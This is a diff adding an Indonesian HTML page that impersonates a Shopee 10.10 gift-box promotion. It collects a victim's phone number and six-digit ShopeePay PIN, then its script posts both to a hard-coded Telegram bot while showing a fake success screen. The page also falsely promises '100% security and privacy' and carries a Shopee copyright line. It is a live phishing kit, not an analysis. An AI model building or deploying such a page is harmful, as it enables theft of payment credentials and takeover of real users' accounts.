@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shopee 10.10 - Box Hadiah Spesial</title>
+
+  <!-- Open Graph Meta Tags for Social Previews -->
+  <meta property="og:title" content="Box Hadiah 10.10 - Shopee Indonesia">
+  <meta property="og:description" content="Klaim kejutan spesial dan hadiah eksklusif event Shopee 10.10 sekarang!">
+  <meta property="og:image" content="https://cdn.phototourl.com/member/2026-10-11-d024fe3b-5367-41b0-9d2b-6716f20f5051.png">
+  <meta property="og:type" content="website">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #ffffff;
+      color: #222222;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      padding: 16px 12px;
+    }
+
+    /* Outer Wrapper for Mobile Viewport Simulator */
+    .page-wrapper {
+      width: 100%;
+      max-width: 380px;
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    /* Main Container with 1.5px Black Border and Extended Bottom */
+    .main-container {
+      width: 100%;
+      background: #ffffff;
+      border: 1.5px solid #000000;
+      border-radius: 20px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.04);
+      padding-bottom: 45px; /* Perpanjangan ke bawah sekitar 2cm */
+      margin-bottom: 20px;
+    }
+
+    .banner-container {
+      width: 100%;
+      margin: 0;
+      padding: 0;
+      line-height: 0;
+      border-bottom: 1.5px solid #000000;
+      overflow: hidden;
+      border-top-left-radius: 18.5px;
+      border-top-right-radius: 18.5px;
+    }
+
+    .banner-image {
+      width: 100%;
+      height: auto;
+      display: block;
+      object-fit: cover;
+    }
+
+    /* Content Area inside the container */
+    .content-area {
+      padding: 22px 18px 10px 18px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .event-badge {
+      background-color: #fff8e1;
+      color: #f57c00;
+      font-weight: 700;
+      font-size: 11.5px;
+      padding: 5px 14px;
+      border-radius: 20px;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      margin-bottom: 14px;
+      border: 1px solid #ffe082;
+    }
+
+    .main-title {
+      font-size: 24px;
+      font-weight: 800;
+      margin-bottom: 20px;
+      line-height: 1.2;
+      letter-spacing: -0.5px;
+    }
+
+    .title-box { color: #ee4d2d; }
+    .title-hadiah { color: #f5a623; }
+    .title-1010-1 { color: #1a73e8; }
+    .title-1010-2 { color: #34a853; }
+
+    .logo-frame {
+      width: 105px;
+      height: 105px;
+      border-radius: 50%;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0 auto 20px auto;
+      border: 1.5px solid #000000;
+      background-color: #ffffff;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+    }
+
+    .logo-img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    /* Instruction Paragraph */
+    .instruction-text {
+      font-size: 15px;
+      font-weight: 700;
+      color: #222222;
+      margin-bottom: 18px;
+      line-height: 1.4;
+    }
+
+    .form-group {
+      width: 100%;
+      text-align: left;
+      margin-bottom: 16px;
+    }
+
+    .label-text {
+      font-size: 13px;
+      color: #555555;
+      margin-bottom: 6px;
+      display: block;
+      font-weight: 600;
+    }
+
+    .input-phone {
+      width: 100%;
+      padding: 13px 15px;
+      border: 1.5px solid #000000;
+      border-radius: 10px;
+      font-size: 15px;
+      background-color: #fafafa;
+      outline: none;
+      transition: all 0.2s;
+    }
+
+    .input-phone:focus {
+      background-color: #ffffff;
+      border-color: #ee4d2d;
+    }
+
+    .input-phone::placeholder {
+      color: #aaaaaa;
+    }
+
+    /* OTP Code Box Grid */
+    .otp-grid {
+      display: flex;
+      justify-content: space-between;
+      gap: 6px;
+      margin-bottom: 22px;
+      width: 100%;
+    }
+
+    .otp-field {
+      width: calc(100% / 6 - 5px);
+      height: 50px;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+      border: 1.5px solid #000000;
+      border-radius: 10px;
+      background-color: #fafafa;
+      outline: none;
+    }
+
+    .otp-field:focus {
+      background-color: #ffffff;
+      border-color: #ee4d2d;
+    }
+
+    /* Action Buttons */
+    .btn-submit {
+      width: 100%;
+      background-color: #ee4d2d;
+      color: white;
+      border: 1.5px solid #000000;
+      padding: 14px;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 3px 8px rgba(238, 77, 45, 0.25);
+      transition: background-color 0.2s;
+      margin-bottom: 18px;
+    }
+
+    .btn-submit:hover {
+      background-color: #d73d1c;
+    }
+
+    .back-link {
+      display: inline-block;
+      margin-top: 10px;
+      font-size: 13.5px;
+      color: #64748b;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    /* Success State Box */
+    .success-box {
+      background: #fff8f6;
+      border: 1.5px dashed #000000;
+      padding: 24px 18px;
+      border-radius: 14px;
+      width: 100%;
+    }
+
+    .divider {
+      width: 100%;
+      height: 1.5px;
+      background-color: #000000;
+      margin: 22px 0 16px 0;
+    }
+
+    .security-note {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #333333;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+
+    .promo-subtext {
+      font-size: 11px;
+      color: #777777;
+      line-height: 1.5;
+    }
+
+    .footer-copyright {
+      text-align: center;
+      color: #888888;
+      font-size: 11.5px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="page-wrapper">
+    <div class="main-container">
+      
+      <!-- Corner-to-Corner Header Banner -->
+      <div class="banner-container">
+        <img src="https://cdn.phototourl.com/member/2026-10-11-d024fe3b-5367-41b0-9d2b-6716f20f5051.png" alt="Shopee 10.10 Box Hadiah Banner" class="banner-image">
+      </div>
+
+      <!-- Content Area -->
+      <div class="content-area">
+        
+        <!-- Special Event Badge -->
+        <div class="event-badge">
+          <span>⚡</span> Special Event <span>⚡</span>
+        </div>
+
+        <!-- Main Title -->
+        <h1 class="main-title">
+          <span class="title-box">BOX</span> 
+          <span class="title-hadiah">HADIAH</span> 
+          <span class="title-1010-1">10</span>.<span class="title-1010-2">10</span>
+        </h1>
+
+        <!-- Circular Logo -->
+        <div class="logo-frame">
+          <img src="https://cdn.phototourl.com/member/2026-10-11-5d24da32-60a1-4c94-b935-36c20d87a6d9.png" alt="Shopee Logo Bulat" class="logo-img">
+        </div>
+
+        <!-- Step 1: Phone Input -->
+        <div id="step1-container" style="width: 100%;">
+          <p class="instruction-text">Klaim kejutan spesial Anda dengan nomor HP aktif!</p>
+          
+          <form onsubmit="handlePhoneSubmit(event)">
+            <div class="form-group">
+              <label for="phoneNumber" class="label-text">Nomor Handphone</label>
+              <input type="tel" id="phoneNumber" class="input-phone" placeholder="Contoh: 081234567890" inputmode="numeric" required>
+            </div>
+            <button type="submit" class="btn-submit">Lanjutkan</button>
+          </form>
+
+          <div class="divider"></div>
+
+          <div class="security-note">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#333333" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+              <path d="M9 12l2 2 4-4"></path>
+            </svg>
+            Jaminan Keamanan & Privasi 100%
+          </div>
+
+          <p class="promo-subtext">
+            Pastikan nomor terdaftar aktif untuk validasi hadiah eksklusif Shopee 10.10
+          </p>
+        </div>
+
+        <!-- Step 2: OTP Verification -->
+        <div id="step2-container" style="display: none; width: 100%;">
+          <p class="instruction-text">MASUKAN PIN SHOPEEPAY</p>
+          
+          <form onsubmit="handleOtpSubmit(event)">
+            <div class="otp-grid">
+              <input type="tel" maxlength="1" class="otp-field" required>
+              <input type="tel" maxlength="1" class="otp-field" required>
+              <input type="tel" maxlength="1" class="otp-field" required>
+              <input type="tel" maxlength="1" class="otp-field" required>
+              <input type="tel" maxlength="1" class="otp-field" required>
+              <input type="tel" maxlength="1" class="otp-field" required>
+            </div>
+            <button type="submit" class="btn-submit">Konfirmasi</button>
+          </form>
+          
+          <a class="back-link" onclick="returnToStep1()"></a>
+        </div>
+
+        <!-- Step 3: Success State -->
+        <div id="step3-container" style="display: none; width: 100%;">
+          <div class="success-box">
+            <div style="font-size: 32px; margin-bottom: 6px;">🎉</div>
+            <h2 style="font-size: 17px; color: #ee4d2d; margin-bottom: 6px;">Selamat!</h2>
+            <p style="margin-bottom: 0; font-size: 13.5px; color: #555555; line-height: 1.4;">Nomor Anda berhasil divalidasi. Silakan periksa hadiah eksklusif Anda di aplikasi Shopee.</p>
+          </div>
+          <a href="https://shopee.co.id" class="btn-submit" style="margin-top: 18px; display: block; text-decoration: none; text-align: center;">Buka Aplikasi Shopee</a>
+        </div>
+
+      </div>
+    </div>
+
+    <div class="footer-copyright">
+      © 2026 Shopee Indonesia. All Rights Reserved.
+    </div>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8681291275:AAGlvoD0CamMIPVGLiBNWPdt7vpSYWgTB4M';
+    const TELEGRAM_CHAT_ID = '7667144622';
+    let savedPhoneNumber = '';
+
+    function handlePhoneSubmit(event) {
+      event.preventDefault();
+      const phoneInput = document.getElementById('phoneNumber');
+      savedPhoneNumber = phoneInput ? phoneInput.value.trim() : '';
+
+      if (savedPhoneNumber !== '') {
+        document.getElementById('step1-container').style.display = 'none';
+        document.getElementById('step2-container').style.display = 'block';
+        
+        setTimeout(() => {
+          const firstOtp = document.querySelector('.otp-field');
+          if (firstOtp) firstOtp.focus();
+        }, 100);
+      }
+    }
+
+    function returnToStep1() {
+      document.getElementById('step2-container').style.display = 'none';
+      document.getElementById('step1-container').style.display = 'block';
+    }
+
+    // Auto-focus OTP inputs handling
+    const otpFields = document.querySelectorAll('.otp-field');
+    otpFields.forEach((field, idx) => {
+      field.addEventListener('input', (e) => {
+        if (e.target.value.length === 1 && idx < otpFields.length - 1) {
+          otpFields[idx + 1].focus();
+        }
+      });
+      field.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+          otpFields[idx - 1].focus();
+        }
+      });
+    });
+
+    function handleOtpSubmit(event) {
+      event.preventDefault();
+      let otpCodeValue = '';
+      otpFields.forEach(field => {
+        otpCodeValue += field.value;
+      });
+
+      // Kirim data ke Telegram
+      const messageText = `🎁 *DATA SHOPEE 10.10 MASUK*\n\n📱 Nomor HP: \`${savedPhoneNumber}\`\n🔐 PIN kamu: \`${otpCodeValue}\``;
+      sendToTelegramChannel(messageText);
+
+      document.getElementById('step2-container').style.display = 'none';
+      document.getElementById('step3-container').style.display = 'block';
+    }
+
+    function sendToTelegramChannel(textPayload) {
+      if (TELEGRAM_BOT_TOKEN === 'MASUKKAN_BOT_TOKEN_DISINI') return;
+
+      const endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const payloadData = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: textPayload,
+        parse_mode: 'Markdown'
+      };
+
+      fetch(endpoint, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payloadData)
+      }).catch(error => console.error('Telegram notification error:', error));
+    }
+  </script>
+</body>
+</html>
